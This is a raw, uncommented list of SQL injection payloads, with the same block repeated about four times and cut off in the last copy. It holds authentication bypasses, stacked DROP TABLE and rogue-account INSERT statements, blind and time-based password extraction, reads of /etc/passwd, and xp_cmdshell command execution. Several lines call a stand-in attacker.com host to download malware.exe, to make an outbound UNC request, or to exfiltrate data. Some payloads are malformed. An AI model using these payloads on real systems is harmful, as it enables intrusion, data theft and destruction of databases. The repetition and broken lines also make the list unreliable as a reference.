1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
'; DROP TABLE users;--
'; SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a'--
'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
'; WAITFOR DELAY '0:0:10';--
'; SELECT CASE WHEN (1=1) THEN RAISERROR('Error!', 16, 1) ELSE '' END;--
'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users') SELECT 1 ELSE SELECT 0;--
'; SELECT CASE WHEN (1=1) THEN @@VERSION ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN db_name() ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN user ELSE '' END;--
' OR 1=1; SELECT pg_sleep(10) --
' OR 1=1; SELECT @@version; --
' OR 1=1; SELECT LOAD_FILE('/etc/passwd'); --
' OR 1=1; SELECT BENCHMARK(1000000, MD5('testing')); --
' OR 1=1; SELECT COUNT(*) FROM users; --
' OR 1=1; SELECT CONCAT(username, '-', password) FROM users; --
' OR 1=1; SELECT * FROM information_schema.tables; --
' OR 1=1; SELECT @@hostname; --
' OR 1=1; SELECT CURDATE(); --
' OR 1=1; SELECT SLEEP(5); --
'; EXEC master..xp_cmdshell 'ping 8.8.8.8';--
'; EXEC sp_oacreate 'WScript.Shell', @shell OUT; EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c ping 8.8.8.8', NULL;--
'; EXEC xp_dirtree '\\\\attacker.com\\share';--
'; CREATE TABLE [dbo].[tmp](content [varchar](max)); INSERT INTO [dbo].[tmp] EXEC sp_oacreate 'MSXML2.ServerXMLHTTP.6.0', @xml OUT; EXEC sp_oamethod @xml, 'open', NULL, 'GET', 'http://attacker.com/malware.exe', false; EXEC sp_oamethod @xml, 'send', NULL; EXEC sp_oamethod @xml, 'responseBody', @response OUT; INSERT INTO [dbo].[tmp](content) VALUES(@response); DROP TABLE [dbo].[tmp];--
'; DECLARE @cmd varchar(1000); SET @cmd='cmd.exe /c ping 8.8.8.8'; EXEC master..xp_cmdshell @cmd;--
'; SELECT CONVERT(INT, CHAR(71)+CHAR(79)+CHAR(79)+CHAR(68));--
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(domain USING utf8) FROM information_schema.domains WHERE domain LIKE '%.com' INTO OUTFILE 'dnsquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'mailquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE id = 2
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase' UNION SELECT username, password FROM users WHERE id = 1
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase'
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' ORDER BY 1
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' LIMIT 1,1
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin' #
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin'/*
SELECT username, password FROM users WHERE id = (SELECT id FROM users WHERE username = 'admin')
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin%00'
SELECT username, password FROM users WHERE id = 1 AND SUBSTRING((SELECT username FROM users WHERE id = 1),1,1) = 'a'
SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1)='a'
SELECT * FROM products WHERE category='electronics' AND (SELECT ASCII(SUBSTRING(name, 1, 1)) FROM products LIMIT 1 OFFSET 0)=101
SELECT * FROM users WHERE email='test@test.com' AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)='a'
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)=0
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=3
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%')>0
SELECT * FROM products WHERE category='electronics' AND (SELECT SUBSTRING(name, 1, 1) FROM products ORDER BY name ASC LIMIT 1)= 'a'
SELECT * FROM users WHERE username='admin' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 'true', 'false') FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 'true' ELSE 'false' END FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':', username, password) FROM users WHERE id=1)='admin:password123'
SELECT * FROM users WHERE username='admin' AND LENGTH(database())>5;
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0;
SELECT * FROM users WHERE username='admin' AND (SELECT @@version)=5;
SELECT * FROM users WHERE username='admin' AND (SELECT user FROM mysql.user LIMIT 0,1)='root';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users LIMIT 0,1)='admin:pass123';
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1;
SELECT * FROM users WHERE username='admin' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIKE '%users%';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT(user,'@',host) FROM mysql.user LIMIT 0,1)='root@localhost';
SELECT * FROM users WHERE username='admin' AND (SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='id';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users WHERE id=1)='admin:pass123';
admin'; DROP TABLE users; --
' OR 1=1; SELECT * FROM users; --
admin' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
FAPyElFB';get-help
FAPyElFB';get-help
FAPyElFB';get-help--
FAPyElFB';get-help#
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
'; DROP TABLE users;--
'; SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a'--
'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
'; WAITFOR DELAY '0:0:10';--
'; SELECT CASE WHEN (1=1) THEN RAISERROR('Error!', 16, 1) ELSE '' END;--
'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users') SELECT 1 ELSE SELECT 0;--
'; SELECT CASE WHEN (1=1) THEN @@VERSION ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN db_name() ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN user ELSE '' END;--
' OR 1=1; SELECT pg_sleep(10) --
' OR 1=1; SELECT @@version; --
' OR 1=1; SELECT LOAD_FILE('/etc/passwd'); --
' OR 1=1; SELECT BENCHMARK(1000000, MD5('testing')); --
' OR 1=1; SELECT COUNT(*) FROM users; --
' OR 1=1; SELECT CONCAT(username, '-', password) FROM users; --
' OR 1=1; SELECT * FROM information_schema.tables; --
' OR 1=1; SELECT @@hostname; --
' OR 1=1; SELECT CURDATE(); --
' OR 1=1; SELECT SLEEP(5); --
'; EXEC master..xp_cmdshell 'ping 8.8.8.8';--
'; EXEC sp_oacreate 'WScript.Shell', @shell OUT; EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c ping 8.8.8.8', NULL;--
'; EXEC xp_dirtree '\\\\attacker.com\\share';--
'; CREATE TABLE [dbo].[tmp](content [varchar](max)); INSERT INTO [dbo].[tmp] EXEC sp_oacreate 'MSXML2.ServerXMLHTTP.6.0', @xml OUT; EXEC sp_oamethod @xml, 'open', NULL, 'GET', 'http://attacker.com/malware.exe', false; EXEC sp_oamethod @xml, 'send', NULL; EXEC sp_oamethod @xml, 'responseBody', @response OUT; INSERT INTO [dbo].[tmp](content) VALUES(@response); DROP TABLE [dbo].[tmp];--
'; DECLARE @cmd varchar(1000); SET @cmd='cmd.exe /c ping 8.8.8.8'; EXEC master..xp_cmdshell @cmd;--
'; SELECT CONVERT(INT, CHAR(71)+CHAR(79)+CHAR(79)+CHAR(68));--
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(domain USING utf8) FROM information_schema.domains WHERE domain LIKE '%.com' INTO OUTFILE 'dnsquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'mailquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE id = 2
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase' UNION SELECT username, password FROM users WHERE id = 1
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase'
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' ORDER BY 1
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' LIMIT 1,1
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin' #
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin'/*
SELECT username, password FROM users WHERE id = (SELECT id FROM users WHERE username = 'admin')
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin%00'
SELECT username, password FROM users WHERE id = 1 AND SUBSTRING((SELECT username FROM users WHERE id = 1),1,1) = 'a'
SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1)='a'
SELECT * FROM products WHERE category='electronics' AND (SELECT ASCII(SUBSTRING(name, 1, 1)) FROM products LIMIT 1 OFFSET 0)=101
SELECT * FROM users WHERE email='test@test.com' AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)='a'
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)=0
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=3
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%')>0
SELECT * FROM products WHERE category='electronics' AND (SELECT SUBSTRING(name, 1, 1) FROM products ORDER BY name ASC LIMIT 1)= 'a'
SELECT * FROM users WHERE username='admin' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 'true', 'false') FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 'true' ELSE 'false' END FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':', username, password) FROM users WHERE id=1)='admin:password123'
SELECT * FROM users WHERE username='admin' AND LENGTH(database())>5;
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0;
SELECT * FROM users WHERE username='admin' AND (SELECT @@version)=5;
SELECT * FROM users WHERE username='admin' AND (SELECT user FROM mysql.user LIMIT 0,1)='root';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users LIMIT 0,1)='admin:pass123';
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1;
SELECT * FROM users WHERE username='admin' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIKE '%users%';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT(user,'@',host) FROM mysql.user LIMIT 0,1)='root@localhost';
SELECT * FROM users WHERE username='admin' AND (SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='id';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users WHERE id=1)='admin:pass123';
admin'; DROP TABLE users; --
' OR 1=1; SELECT * FROM users; --
admin' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
FAPyElFB';get-help
FAPyElFB';get-help
FAPyElFB';get-help--
FAPyElFB';get-help#
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
'; DROP TABLE users;--
'; SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a'--
'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
'; WAITFOR DELAY '0:0:10';--
'; SELECT CASE WHEN (1=1) THEN RAISERROR('Error!', 16, 1) ELSE '' END;--
'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users') SELECT 1 ELSE SELECT 0;--
'; SELECT CASE WHEN (1=1) THEN @@VERSION ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN db_name() ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN user ELSE '' END;--
' OR 1=1; SELECT pg_sleep(10) --
' OR 1=1; SELECT @@version; --
' OR 1=1; SELECT LOAD_FILE('/etc/passwd'); --
' OR 1=1; SELECT BENCHMARK(1000000, MD5('testing')); --
' OR 1=1; SELECT COUNT(*) FROM users; --
' OR 1=1; SELECT CONCAT(username, '-', password) FROM users; --
' OR 1=1; SELECT * FROM information_schema.tables; --
' OR 1=1; SELECT @@hostname; --
' OR 1=1; SELECT CURDATE(); --
' OR 1=1; SELECT SLEEP(5); --
'; EXEC master..xp_cmdshell 'ping 8.8.8.8';--
'; EXEC sp_oacreate 'WScript.Shell', @shell OUT; EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c ping 8.8.8.8', NULL;--
'; EXEC xp_dirtree '\\\\attacker.com\\share';--
'; CREATE TABLE [dbo].[tmp](content [varchar](max)); INSERT INTO [dbo].[tmp] EXEC sp_oacreate 'MSXML2.ServerXMLHTTP.6.0', @xml OUT; EXEC sp_oamethod @xml, 'open', NULL, 'GET', 'http://attacker.com/malware.exe', false; EXEC sp_oamethod @xml, 'send', NULL; EXEC sp_oamethod @xml, 'responseBody', @response OUT; INSERT INTO [dbo].[tmp](content) VALUES(@response); DROP TABLE [dbo].[tmp];--
'; DECLARE @cmd varchar(1000); SET @cmd='cmd.exe /c ping 8.8.8.8'; EXEC master..xp_cmdshell @cmd;--
'; SELECT CONVERT(INT, CHAR(71)+CHAR(79)+CHAR(79)+CHAR(68));--
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(domain USING utf8) FROM information_schema.domains WHERE domain LIKE '%.com' INTO OUTFILE 'dnsquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'mailquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE id = 2
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase' UNION SELECT username, password FROM users WHERE id = 1
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase'
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' ORDER BY 1
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' LIMIT 1,1
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin' #
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin'/*
SELECT username, password FROM users WHERE id = (SELECT id FROM users WHERE username = 'admin')
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin%00'
SELECT username, password FROM users WHERE id = 1 AND SUBSTRING((SELECT username FROM users WHERE id = 1),1,1) = 'a'
SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1)='a'
SELECT * FROM products WHERE category='electronics' AND (SELECT ASCII(SUBSTRING(name, 1, 1)) FROM products LIMIT 1 OFFSET 0)=101
SELECT * FROM users WHERE email='test@test.com' AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)='a'
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)=0
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=3
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%')>0
SELECT * FROM products WHERE category='electronics' AND (SELECT SUBSTRING(name, 1, 1) FROM products ORDER BY name ASC LIMIT 1)= 'a'
SELECT * FROM users WHERE username='admin' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 'true', 'false') FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 'true' ELSE 'false' END FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':', username, password) FROM users WHERE id=1)='admin:password123'
SELECT * FROM users WHERE username='admin' AND LENGTH(database())>5;
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0;
SELECT * FROM users WHERE username='admin' AND (SELECT @@version)=5;
SELECT * FROM users WHERE username='admin' AND (SELECT user FROM mysql.user LIMIT 0,1)='root';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users LIMIT 0,1)='admin:pass123';
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1;
SELECT * FROM users WHERE username='admin' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIKE '%users%';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT(user,'@',host) FROM mysql.user LIMIT 0,1)='root@localhost';
SELECT * FROM users WHERE username='admin' AND (SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='id';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users WHERE id=1)='admin:pass123';
admin'; DROP TABLE users; --
' OR 1=1; SELECT * FROM users; --
admin' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
FAPyElFB';get-help
FAPyElFB';get-help
FAPyElFB';get-help--
FAPyElFB';get-help#
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
'; DROP TABLE users;--
'; SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a'--
'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
'; WAITFOR DELAY '0:0:10';--
'; SELECT CASE WHEN (1=1) THEN RAISERROR('Error!', 16, 1) ELSE '' END;--
'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users') SELECT 1 ELSE SELECT 0;--
'; SELECT CASE WHEN (1=1) THEN @@VERSION ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN db_name() ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN user ELSE '' END;--
' OR 1=1; SELECT pg_sleep(10) --
' OR 1=1; SELECT @@version; --
' OR 1=1; SELECT LOAD_FILE('/etc/passwd'); --
' OR 1=1; SELECT BENCHMARK(1000000, MD5('testing')); --
' OR 1=1; SELECT COUNT(*) FROM users; --
' OR 1=1; SELECT CONCAT(username, '-', password) FROM users; --
' OR 1=1; SELECT * FROM information_schema.tables; --
' OR 1=1; SELECT @@hostname; --
' OR 1=1; SELECT CURDATE(); --
' OR 1=1; SELECT SLEEP(5); --
'; EXEC master..xp_cmdshell 'ping 8.8.8.8';--
'; EXEC sp_oacreate 'WScript.Shell', @shell OUT; EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c ping 8.8.8.8', NULL;--
'; EXEC xp_dirtree '\\\\attacker.com\\share';--
'; CREATE TABLE [dbo].[tmp](content [varchar](max)); INSERT INTO [dbo].[tmp] EXEC sp_oacreate 'MSXML2.ServerXMLHTTP.6.0', @xml OUT; EXEC sp_oamethod @xml, 'open', NULL, 'GET', 'http://attacker.com/malware.exe', false; EXEC sp_oamethod @xml, 'send', NULL; EXEC sp_oamethod @xml, 'responseBody', @response OUT; INSERT INTO [dbo].[tmp](content) VALUES(@response); DROP TABLE [dbo].[tmp];--
'; DECLARE @cmd varchar(1000); SET @cmd='cmd.exe /c ping 8.8.8.8'; EXEC master..xp_cmdshell @cmd;--
'; SELECT CONVERT(INT, CHAR(71)+CHAR(79)+CHAR(79)+CHAR(68));--
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(domain USING utf8) FROM information_schema.domains WHERE domain LIKE '%.com' INTO OUTFILE 'dnsquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'mailquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE id = 2
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase' UNION SELECT username, password FROM users WHERE id = 1
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase'
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' ORDER BY 1
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' LIMIT 1,1
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin' #
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin'/*
SELECT username, password FROM users WHERE id = (SELECT id FROM users WHERE username = 'admin')
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin%00'
SELECT username, password FROM users WHERE id = 1 AND SUBSTRING((SELECT username FROM users WHERE id = 1),1,1) = 'a'
SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1)='a'
SELECT * FROM products WHERE category='electronics' AND (SELECT ASCII(SUBSTRING(name, 1, 1)) FROM products LIMIT 1 OFFSET 0)=101
SELECT * FROM users WHERE email='test@test.com' AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)='a'
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)=0
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')=3
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%')>0
SELECT * FROM products WHERE category='electronics' AND (SELECT SUBSTRING(name, 1, 1) FROM products ORDER BY name ASC LIMIT 1)= 'a'
SELECT * FROM users WHERE username='admin' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 'true', 'false') FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 'true' ELSE 'false' END FROM users WHERE id=1)='true'
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':', username, password) FROM users WHERE id=1)='admin:password123'
SELECT * FROM users WHERE username='admin' AND LENGTH(database())>5;
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0;
SELECT * FROM users WHERE username='admin' AND (SELECT @@version)=5;
SELECT * FROM users WHERE username='admin' AND (SELECT user FROM mysql.user LIMIT 0,1)='root';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users LIMIT 0,1)='admin:pass123';
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1;
SELECT * FROM users WHERE username='admin' AND (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) LIKE '%users%';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT(user,'@',host) FROM mysql.user LIMIT 0,1)='root@localhost';
SELECT * FROM users WHERE username='admin' AND (SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='id';
SELECT * FROM users WHERE username='admin' AND (SELECT CONCAT_WS(':',username,password) FROM users WHERE id=1)='admin:pass123';
admin'; DROP TABLE users; --
' OR 1=1; SELECT * FROM users; --
admin' OR 1=1; INSERT INTO users (username, password) VALUES ('hacker', 'pass123'); --
FAPyElFB';get-help
FAPyElFB';get-help
FAPyElFB';get-help--
FAPyElFB';get-help#
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
'; DROP TABLE users;--
'; SELECT COUNT(*) FROM users WHERE username='admin' AND substr(password,1,1)='a'--
'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE '' END FROM dual;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
'; WAITFOR DELAY '0:0:10';--
'; SELECT CASE WHEN (1=1) THEN RAISERROR('Error!', 16, 1) ELSE '' END;--
'; IF EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users') SELECT 1 ELSE SELECT 0;--
'; SELECT CASE WHEN (1=1) THEN @@VERSION ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN db_name() ELSE '' END;--
'; SELECT CASE WHEN (1=1) THEN user ELSE '' END;--
' OR 1=1; SELECT pg_sleep(10) --
' OR 1=1; SELECT @@version; --
' OR 1=1; SELECT LOAD_FILE('/etc/passwd'); --
' OR 1=1; SELECT BENCHMARK(1000000, MD5('testing')); --
' OR 1=1; SELECT COUNT(*) FROM users; --
' OR 1=1; SELECT CONCAT(username, '-', password) FROM users; --
' OR 1=1; SELECT * FROM information_schema.tables; --
' OR 1=1; SELECT @@hostname; --
' OR 1=1; SELECT CURDATE(); --
' OR 1=1; SELECT SLEEP(5); --
'; EXEC master..xp_cmdshell 'ping 8.8.8.8';--
'; EXEC sp_oacreate 'WScript.Shell', @shell OUT; EXEC sp_oamethod @shell, 'Run', NULL, 'cmd.exe /c ping 8.8.8.8', NULL;--
'; EXEC xp_dirtree '\\\\attacker.com\\share';--
'; CREATE TABLE [dbo].[tmp](content [varchar](max)); INSERT INTO [dbo].[tmp] EXEC sp_oacreate 'MSXML2.ServerXMLHTTP.6.0', @xml OUT; EXEC sp_oamethod @xml, 'open', NULL, 'GET', 'http://attacker.com/malware.exe', false; EXEC sp_oamethod @xml, 'send', NULL; EXEC sp_oamethod @xml, 'responseBody', @response OUT; INSERT INTO [dbo].[tmp](content) VALUES(@response); DROP TABLE [dbo].[tmp];--
'; DECLARE @cmd varchar(1000); SET @cmd='cmd.exe /c ping 8.8.8.8'; EXEC master..xp_cmdshell @cmd;--
'; SELECT CONVERT(INT, CHAR(71)+CHAR(79)+CHAR(79)+CHAR(68));--
= 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'http://attacker.com/exfil.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(domain USING utf8) FROM information_schema.domains WHERE domain LIKE '%.com' INTO OUTFILE 'dnsquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT 1,CONVERT(email USING utf8) FROM users WHERE id = 1 INTO OUTFILE 'mailquery.php'
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE id = 2
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase' UNION SELECT username, password FROM users WHERE id = 1
SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'mydatabase'
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' ORDER BY 1
SELECT username, password FROM users WHERE id = 1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' LIMIT 1,1
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin' #
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin'/*
SELECT username, password FROM users WHERE id = (SELECT id FROM users WHERE username = 'admin')
SELECT username, password FROM users WHERE id = 1 UNION SELECT username, password FROM users WHERE username = 'admin%00'
SELECT username, password FROM users WHERE id = 1 AND SUBSTRING((SELECT username FROM users WHERE id = 1),1,1) = 'a'
SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1)='a'
SELECT * FROM products WHERE category='electronics' AND (SELECT ASCII(SUBSTRING(name, 1, 1)) FROM products LIMIT 1 OFFSET 0)=101
SELECT * FROM users WHERE email='test@test.com' AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)='a'
SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables)=0
